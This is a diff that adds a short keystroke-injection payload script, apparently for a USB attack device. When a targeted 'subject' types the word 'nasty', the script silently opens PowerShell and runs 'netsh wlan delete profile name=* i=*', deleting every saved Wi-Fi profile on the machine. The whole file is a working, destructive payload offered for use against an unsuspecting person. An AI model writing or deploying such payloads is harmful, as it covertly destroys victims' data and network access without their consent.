@@ -1,0 +1,15 @@
+## Deletes all wifi passwords when the subject types "nasty"
+
+MATCH nasty
+QUACK GUI;
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK DELAY 100
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING netsh wlan delete profile name=* i=*
+QUACK DELAY 100
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING exit
+QUACK ENTER
